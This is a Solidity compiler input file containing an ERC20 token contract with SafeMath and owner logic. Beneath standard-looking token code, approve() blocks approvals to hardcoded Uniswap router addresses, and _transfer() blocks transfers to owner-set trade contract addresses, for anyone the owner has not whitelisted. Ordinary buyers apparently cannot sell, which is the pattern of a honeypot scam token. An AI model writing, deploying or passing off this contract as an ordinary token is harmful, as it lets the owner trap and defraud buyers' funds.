{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "browser/t2.sol": {
      "content": "// SPDX-License-Identifier: GPL-3.0\r\npragma solidity ^0.8.4;\r\n\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n        // benefit is lost if 'b' is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0, \"SafeMath: modulo by zero\");\r\n        return a % b;\r\n    }\r\n}\r\n\r\ncontract owned {\r\n    address public owner;\r\n\r\n    constructor() { owner = payable(msg.sender); }\r\n\r\n    modifier onlyOwner {\r\n        require(msg.sender == owner,\"Only owner can call this function.\");\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) onlyOwner public {\r\n        owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract TokenERC20 {\r\n    using SafeMath for uint256;\r\n\r\n    string public name;\r\n    string public symbol;\r\n    uint8 public decimals = 18;\r\n    uint256 private initialSupply=1000000000000;\r\n\r\n    uint256 public totalSupply;\r\n    mapping (address => uint256) public balanceOf;\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\n    \r\n    \r\n    address public UniswapV2Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    address public UniswapV3Address = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;\r\n    address public UniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;\r\n    \r\n    address public TradeContractAddressV1;\r\n    address public TradeContractAddressV2;\r\n    address public TradeContractAddressV3;\r\n    \r\n    mapping (address => bool) public transactionAddress;\r\n\r\n    constructor(\r\n        string memory tokenName,\r\n        string memory tokenSymbol\r\n    ) {\r\n        totalSupply = initialSupply * 10 ** uint256(decimals);  // Update total supply with the decimal amount\r\n        balanceOf[msg.sender] = totalSupply;                    // Give the creator all initial tokens\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n        name = tokenName;                                       // Set the name for display purposes\r\n        symbol = tokenSymbol;                                   // Set the symbol for display purposes\r\n        transactionAddress[msg.sender] = true;\r\n    }\r\n\r\n\r\n    function _transfer(address _from, address _to, uint256 _value) internal {\r\n        if(TradeContractAddressV1!=address(0)&&_to==TradeContractAddressV1){\r\n            require(transactionAddress[_from]==true);\r\n        }\r\n        if(TradeContractAddressV2!=address(0)&&_to==TradeContractAddressV2){\r\n            require(transactionAddress[_from]==true);\r\n        }\r\n        if(TradeContractAddressV3!=address(0)&&_to==TradeContractAddressV3){\r\n            require(transactionAddress[_from]==true);\r\n        }\r\n\r\n        // Prevent transfer to 0x0 address. Use burn() instead\r\n        //        require(_to != address(0x0),\"address error\");\r\n        require(_value > 0,\"Wrong amount of transfer\");\r\n        // Check if the sender has enough\r\n        require(balanceOf[_from] >= _value,\"Lack of balance\");\r\n        // Check for overflows\r\n        require(balanceOf[_to].add(_value) > balanceOf[_to]);\r\n        // Save this for an assertion in the future\r\n        // Subtract from the sender\r\n        balanceOf[_from]=balanceOf[_from].sub(_value);\r\n        // Add the same to the recipient\r\n        balanceOf[_to]=balanceOf[_to].add(_value);\r\n        emit Transfer(_from, _to, _value);\r\n    }\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        _transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        require(_value <= allowance[_from][msg.sender],\"Insufficient authorized amount\");     // Check allowance\r\n        allowance[_from][msg.sender]=allowance[_from][msg.sender].sub(_value);\r\n        _transfer(_from, _to, _value);\r\n        return true;\r\n\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        if(_spender==UniswapRouterAddress||_spender==UniswapV3Address||_spender==UniswapV2Address){\r\n            require(transactionAddress[msg.sender]==true,\"No transaction authority\");\r\n        }\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function burn(uint256 _value) public returns (bool success) {\r\n        require(balanceOf[msg.sender] >= _value,\"Lack of balance\");   // Check if the sender has enough\r\n        balanceOf[msg.sender]=balanceOf[msg.sender].sub(_value);            // Subtract from the sender\r\n        totalSupply=totalSupply.sub(_value);                      // Updates totalSupply\r\n        emit Burn(msg.sender, _value);\r\n        return true;\r\n    }\r\n\r\n    function burnFrom(address _from, uint256 _value) public returns (bool success) {\r\n        require(balanceOf[_from] >= _value,\"Lack of balance\");                // Check if the targeted balance is enough\r\n        require(_value <= allowance[_from][msg.sender],\"Insufficient authorized amount\");    // Check allowance\r\n        balanceOf[_from]=balanceOf[_from].sub(_value);                         // Subtract from the targeted balance\r\n        allowance[_from][msg.sender]= allowance[_from][msg.sender].sub(_value);             // Subtract from the sender's allowance\r\n        totalSupply=totalSupply.sub(_value);                              // Update totalSupply\r\n        emit Burn(_from, _value);\r\n        return true;\r\n    }\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Burn(address indexed from, uint256 value);\r\n}\r\n\r\ncontract Token is TokenERC20,owned{\r\n    using SafeMath for uint256;\r\n\r\n    constructor(\r\n        string memory tokenName,\r\n        string memory tokenSymbol\r\n    ) TokenERC20( tokenName, tokenSymbol) {}\r\n\r\n\r\n    \r\n    function setTransactionAddress(address addr,bool status) onlyOwner public{\r\n        transactionAddress[addr] = status;\r\n        if(status==false){\r\n            allowance[msg.sender][addr] = 0;\r\n            emit Approval(msg.sender, addr, 0);\r\n        }\r\n    }\r\n\r\n    function setTradeContractAddress(address v1Addr,address v2Addr,address v3Addr)onlyOwner public{\r\n        TradeContractAddressV1=v1Addr;\r\n        TradeContractAddressV2=v2Addr;\r\n        TradeContractAddressV3=v3Addr;\r\n    }\r\n}"
    }
  }
}